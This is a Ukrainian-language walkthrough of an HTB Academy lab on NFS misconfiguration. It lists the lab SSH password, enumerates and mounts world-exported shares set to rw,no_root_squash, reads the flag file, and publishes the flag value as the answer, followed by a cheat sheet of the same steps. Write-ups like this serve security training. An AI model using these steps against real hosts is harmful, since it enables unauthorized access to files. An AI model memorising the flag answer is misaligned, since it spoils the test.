## Miscellaneous Techniques

Ціль: `10.129.2.210`  

Питання:
- Review NFS server's export list і знайти директорію, де лежить флаг.

Відповідь:
- `fc8c065b9384beaa162afe436a694acf`

***

## Термінал 1 — доступ на ціль

```bash
ssh htb-student@10.129.2.210
# Password: Academy_LLPE!
```

Перевіряємо NFS-експорти:

```bash
showmount -e 10.129.2.210
```

Отримуємо:

```text
Export list for 10.129.2.210:
/tmp             *
/var/nfs/general *
```

Додатково:

```bash
cat /etc/exports
```

```text
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

- Дві директорії експортуються по NFS: `/tmp` та `/var/nfs/general`.
- Опція `rw,no_root_squash` означає, що root на клієнті не буде "знижений" до `nobody` і потенційно може робити прівеск, але тут завдання лише на пошук флага в експорті, не на full root-прівеск. [juggernaut-sec](https://juggernaut-sec.com/nfs-no_root_squash/)

***

## Термінал 2 — маунт NFS на Pwnbox

На Pwnbox:

```bash
mkdir -p /tmp/nfs-tmp
mkdir -p /tmp/nfs-general
```

Маунтимо обидва експорти (версія NFS 3):

```bash
sudo mount -t nfs -o vers=3 10.129.2.210:/tmp /tmp/nfs-tmp
sudo mount -t nfs -o vers=3 10.129.2.210:/var/nfs/general /tmp/nfs-general
```

Перевіряємо вміст:

```bash
ls -R /tmp/nfs-tmp
ls -R /tmp/nfs-general
```

Вивід:

```text
/tmp/nfs-tmp:
snap-private-tmp
systemd-private-...-apache2.service-...
systemd-private-...-systemd-resolved.service-...
systemd-private-...-systemd-timesyncd.service-...
VMwareDnD
vmware-root_888-2730562489
# (більшість каталогів закрита: Permission denied)

/tmp/nfs-general:
exports_flag.txt
```

- У `/tmp/nfs-general` є файл `exports_flag.txt` — саме він тримає флаг для цього завдання.

***

## Термінал 2 — прочитати флаг

```bash
cat /tmp/nfs-general/exports_flag.txt
```

Результат:

```text
fc8c065b9384beaa162afe436a694acf
```

Це правильний флаг для секції **Miscellaneous Techniques / NFS (Logrotate)**, а не вигаданий `flag.txt` в цьому каталозі.

***

## Шпаргалка: Miscellaneous Techniques – NFS export

### Термінал 1 (ціль)

1. Залогінитися:

   ```bash
   ssh htb-student@10.129.2.210
   # Password: Academy_LLPE!
   ```

2. Подивитися експортний список:

   ```bash
   showmount -e 10.129.2.210
   ```

3. Подивитися конфіг:

   ```bash
   cat /etc/exports
   # /var/nfs/general *(rw,no_root_squash)
   # /tmp *(rw,no_root_squash)
   ```

### Термінал 2 (Pwnbox)

1. Підготувати точки маунта:

   ```bash
   mkdir -p /tmp/nfs-tmp
   mkdir -p /tmp/nfs-general
   ```

2. Маунтнути NFS-експорти:

   ```bash
   sudo mount -t nfs -o vers=3 10.129.2.210:/tmp /tmp/nfs-tmp
   sudo mount -t nfs -o vers=3 10.129.2.210:/var/nfs/general /tmp/nfs-general
   ```

3. Перевірити вміст:

   ```bash
   ls -R /tmp/nfs-tmp
   ls -R /tmp/nfs-general
   ```

4. Прочитати флаг:

   ```bash
   cat /tmp/nfs-general/exports_flag.txt
   # fc8c065b9384beaa162afe436a694acf
   ```
